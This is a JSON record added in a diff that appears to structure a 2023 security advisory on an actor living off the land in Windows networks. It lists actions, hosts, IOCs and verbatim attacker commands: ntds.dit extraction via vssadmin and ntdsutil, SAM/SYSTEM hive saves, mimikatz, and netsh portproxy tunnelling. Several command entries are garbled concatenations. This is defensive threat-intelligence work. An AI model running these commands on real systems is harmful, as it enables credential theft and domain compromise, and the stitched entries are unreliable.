@@ -1,0 +1,2473 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2023-230524",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "fcc3dcb341de9c407b5c5b48704f4ba034132e66ba1260082b081990db8b0268",
+  "source_name": "csa-2023-230524"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "Executed WMIC command to gather information about local drives",
+   "source": "llm",
+   "description": "cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-1"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a2",
+   "name": "Created a Volume Shadow Copy and extracted a copy of the ntds.dit file",
+   "source": "llm",
+   "description": "cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a3",
+   "name": "Executed WMIC commands to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe",
+   "source": "llm",
+   "description": "wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\pro\" and similar commands",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-3",
+    "evidence-4"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1047",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a4",
+   "name": "Used netsh interface portproxy add commands to enable port forwarding on the host",
+   "source": "llm",
+   "description": "cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\" and similar",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-5",
+    "evidence-6"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a5",
+   "name": "Used PowerShell command to identify successful logons to the host",
+   "source": "llm",
+   "description": "Get-EventLog security -instanceid 4624",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a6",
+   "name": "Used Impacket's wmiexec to execute commands redirecting output to a file in ADMIN$ share",
+   "source": "llm",
+   "description": "cmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-8"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a7",
+   "name": "Executed commands to enumerate network topology, Active Directory structure, and environment information",
+   "source": "llm",
+   "description": "Commands including arp -a, curl www.ip-api.com, dnscmd, ipconfig /all, ldifde.exe, net localgroup administrators, net group /dom, netsh interface firewall show all, netstat -ano, reg query hklm\\software\\, systeminfo, tasklist /v, whoami, wmic volume list brief, wmic service brief, wmic product list brief, wmic baseboard list full, wevtutil qe security",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-9"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a8",
+   "name": "Executed commands to identify additional credential theft opportunities",
+   "source": "llm",
+   "description": "Commands including dir C:\\Users\\{REDACTED}\\.ssh\\known_hosts, mimikatz.exe, reg query hklm\\software\\OpenSSH, reg save hklm\\sam ss.dat, reg save hklm\\system sy.dat",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-10"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  },
+  {
+   "id": "a9",
+   "name": "Executed additional commands including archiving, process execution, network commands, and file copying",
+   "source": "llm",
+   "description": "Commands including 7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z, C:\\Windows\\system32\\pcwrun.exe, C:\\Users\\Administrator\\Desktop\\Win.exe, cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1, net use \\\\127.0.0.1\\IPC$ /y /d, powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden, rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED}, wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED}, cmd /c whoami, xcopy C:\\windows\\temp\\hp d:\\{REDACTED}",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires an isolated, versioned Windows AD DC/member fixture; OS/AD versions and topology are missing. No version is assumed."
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "The later action uses the copy of ntds.dit file created by the earlier action",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r2",
+   "from_action": "a3",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The later action is additional commands executed after creating copies using ntdsutil",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r3",
+   "from_action": "a4",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The additional commands include portproxy commands similar to those in a4",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r4",
+   "from_action": "a5",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The additional commands include the PowerShell command to identify successful logons",
+   "evidence_refs": [
+    "evidence-14"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r5",
+   "from_action": "a6",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The additional commands include commands redirecting output to ADMIN$ share as in a6",
+   "evidence_refs": [
+    "evidence-15"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r6",
+   "from_action": "a1",
+   "to_action": "a7",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "narrative order only",
+   "evidence_refs": [],
+   "epistemic_status": "inferred"
+  },
+  {
+   "id": "r7",
+   "from_action": "a7",
+   "to_action": "a8",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "narrative order only",
+   "evidence_refs": [],
+   "epistemic_status": "inferred"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "hosts targeted for exfiltration of ntds.dit and SYSTEM registry hive",
+   "source": "llm",
+   "name": "Windows domain controllers",
+   "os": "Windows",
+   "network_placement": "domain controllers in the network",
+   "evidence_refs": [
+    "evidence-16",
+    "evidence-17",
+    "evidence-18"
+   ],
+   "epistemic_status": "supported",
+   "service_refs": [
+    "s1"
+   ]
+  },
+  {
+   "id": "h2",
+   "role": "intermediate infrastructure to obscure activity and obfuscate source of command and control traffic",
+   "source": "llm",
+   "name": "Compromised SOHO network devices",
+   "network_placement": "small office/home office network devices",
+   "evidence_refs": [
+    "evidence-19",
+    "evidence-20"
+   ],
+   "epistemic_status": "supported",
+   "service_refs": []
+  },
+  {
+   "id": "h3",
+   "role": "hosts where living off the land commands and tools are executed, including portproxy, WMIC, PowerShell, Impacket wmiexec",
+   "source": "llm",
+   "name": "Internal hosts with Windows OS",
+   "os": "Windows",
+   "network_placement": "internal network hosts",
+   "evidence_refs": [
+    "evidence-21",
+    "evidence-22",
+    "evidence-23",
+    "evidence-24",
+    "evidence-25"
+   ],
+   "epistemic_status": "insufficient",
+   "service_refs": [
+    "s2",
+    "s3",
+    "s4",
+    "s5",
+    "svc-unsupported-ad-ds-h3"
+   ]
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "Active Directory database (ntds.dit)",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h1",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false
+  },
+  {
+   "id": "s2",
+   "name": "Windows Management Instrumentation Command Line (WMIC)",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h3",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false
+  },
+  {
+   "id": "s3",
+   "name": "PowerShell",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h3",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false
+  },
+  {
+   "id": "s4",
+   "name": "PortProxy (netsh interface portproxy)",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h3",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false
+  },
+  {
+   "id": "s5",
+   "name": "Impacket wmiexec",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h3",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false
+  },
+  {
+   "id": "svc-unsupported-ad-ds-h3",
+   "name": "Active Directory",
+   "cve": [],
+   "catalogue_component": "unsupported-ad-ds",
+   "is_substitute": false,
+   "epistemic_status": "inferred",
+   "source": "program",
+   "host_ref": "h3"
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1",
+   "h2",
+   "h3"
+  ],
+  "service_refs": [
+   "s1",
+   "s2",
+   "s3",
+   "s4",
+   "s5"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "ntdsutil.exe",
+   "type": "tool",
+   "id": "art1",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-26"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "Impacket",
+   "type": "tool",
+   "id": "art2",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-27",
+    "evidence-28"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "mimikatz.exe",
+   "type": "tool",
+   "id": "art3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-29"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "PowerShell scripts",
+   "type": "script",
+   "id": "art4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-30"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "ADMIN$ share",
+   "type": "artifact",
+   "id": "art5",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-31"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "domain",
+   "value": "www.cisa.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-32"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "domain",
+   "value": "www.ic3.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-33"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "cve",
+   "value": "CVE-2021-40539",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-34"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "cve",
+   "value": "CVE-2021-27860",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-35"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "hash",
+   "value": "f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-36"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "hash",
+   "value": "ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-37"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "hash",
+   "value": "d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-38"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "hash",
+   "value": "472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-39"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "hash",
+   "value": "66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-40"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "hash",
+   "value": "3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-41"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "hash",
+   "value": "41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-42"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "hash",
+   "value": "c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-43"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "hash",
+   "value": "3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-44"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "hash",
+   "value": "fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-45"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "hash",
+   "value": "ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-46"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "url",
+   "value": "https://learn.microsoft.com/en-us/windows-server/identity/ad-",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-47",
+    "evidence-48"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "domain",
+   "value": "learn.microsoft.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-49",
+    "evidence-50",
+    "evidence-51"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "url",
+   "value": "https://learn.microsoft.com/en-us/previous-versions/windows/it-",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-52"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "url",
+   "value": "https://media.defense.gov/2022/Jun/22/2003021689/-1/-",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-53"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "domain",
+   "value": "www.microsoft.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-54"
+   ]
+  },
+  {
+   "id": "indicator-21",
+   "type": "domain",
+   "value": "media.defense.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-55"
+   ]
+  },
+  {
+   "id": "indicator-22",
+   "type": "domain",
+   "value": "www.mandiant.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-56"
+   ]
+  },
+  {
+   "id": "indicator-23",
+   "type": "domain",
+   "value": "www.fbi.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-57"
+   ]
+  }
+ ],
+ "commands": [
+  {
+   "id": "command-1",
+   "interpreter": "cmd",
+   "command": "cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-58"
+   ]
+  },
+  {
+   "id": "command-2",
+   "interpreter": "cmd",
+   "command": "cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-59"
+   ]
+  },
+  {
+   "id": "command-3",
+   "interpreter": "cmd",
+   "command": "cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD S\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-60"
+   ]
+  },
+  {
+   "id": "command-4",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-61"
+   ]
+  },
+  {
+   "id": "command-5",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" \"cmd.exe\" /c wmic process call create \"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-62"
+   ]
+  },
+  {
+   "id": "command-6",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-63",
+    "evidence-64"
+   ]
+  },
+  {
+   "id": "command-7",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-65"
+   ]
+  },
+  {
+   "id": "command-8",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\"\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-66"
+   ]
+  },
+  {
+   "id": "command-9",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=<rfc1918 internal ip address>\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-67"
+   ]
+  },
+  {
+   "id": "command-10",
+   "interpreter": "powershell",
+   "command": "PowerShell [T1059.001] command to identify",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-68"
+   ]
+  },
+  {
+   "id": "command-11",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-69"
+   ]
+  },
+  {
+   "id": "command-12",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1 net use \\\\127.0.0.1\\IPC$ /y /d",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-70"
+   ]
+  },
+  {
+   "id": "command-13",
+   "interpreter": "powershell",
+   "command": "powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\ wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED}",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-71"
+   ]
+  },
+  {
+   "id": "command-14",
+   "interpreter": "cmd",
+   "command": "cmd /c whoami xcopy C:\\windows\\temp\\hp d:\\{REDACTED}",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-72"
+   ]
+  },
+  {
+   "id": "command-15",
+   "interpreter": "cmd",
+   "command": "cmd /c \"cmd.exe /c \"netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999\"\" C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-73"
+   ]
+  },
+  {
+   "id": "command-16",
+   "interpreter": "cmd",
+   "command": "cmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >> c:\\windows\\temp\\{REDACTED}.tmp \"cmd.exe\" /c wmic process call create \"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-74"
+   ]
+  },
+  {
+   "id": "command-17",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-75"
+   ]
+  },
+  {
+   "id": "command-18",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c net group \"domain admins\" /dom 1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-76"
+   ]
+  },
+  {
+   "id": "command-19",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1 D:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED} Get-EventLog security -instanceid 4624 ldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree makecab ..\\backup\\210829-020000.zip ..\\webapps\\adssp\\html\\Lock.lic move \"\\\\<redacted>\\c$\\users\\public\\Appfile\\registry\\SYSTEM\" ..\\backup\\210829-020000.zip netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999 Rar.exe a –{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp start-process -filepath c:\\windows\\temp\\<filename>.bat - windowstyle hidden 1 Note: The batch file in question (<filename>.bat) could use any name, and no discernable pattern has been determined at this time. wmic process call create \"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-77"
+   ]
+  },
+  {
+   "id": "command-20",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c mkdir C:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\users\\public\\Appfile\\\" q q",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-78"
+   ]
+  },
+  {
+   "id": "command-21",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" wmic process call create \"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-79"
+   ]
+  },
+  {
+   "id": "command-22",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-80"
+   ]
+  },
+  {
+   "id": "command-23",
+   "interpreter": "cmd",
+   "command": "cmd.exe /C dir /S \\\\* >> * ",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-81"
+   ]
+  },
+  {
+   "id": "command-24",
+   "interpreter": "cmd",
+   "command": "cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1 ",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-82"
+   ]
+  },
+  {
+   "id": "command-25",
+   "interpreter": "powershell",
+   "command": "powershell start-process -filepath c:\\windows\\temp\\*.exe - windowstyle hidden",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-83"
+   ]
+  }
+ ],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "The actor has executed the following command to gather information about local drives: cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "20"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": "The actor has executed the following command to gather information about local drives:"
+  },
+  {
+   "id": "evidence-2",
+   "quote": "The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it. cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "26"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8095,
+   "matched_text": "cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD"
+  },
+  {
+   "id": "evidence-3",
+   "quote": "The actor has executed WMIC commands to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "28"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file\nand SYSTEM registry hive using ntdsutil.exe. Each of the following actor comm"
+  },
+  {
+   "id": "evidence-4",
+   "quote": "wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\pro wmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" \"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n         full C:\\Windows\\Temp\\pro\n         wmic process call create \"cmd.exe /c ntdsutil \\\"ac i nt"
+  },
+  {
+   "id": "evidence-5",
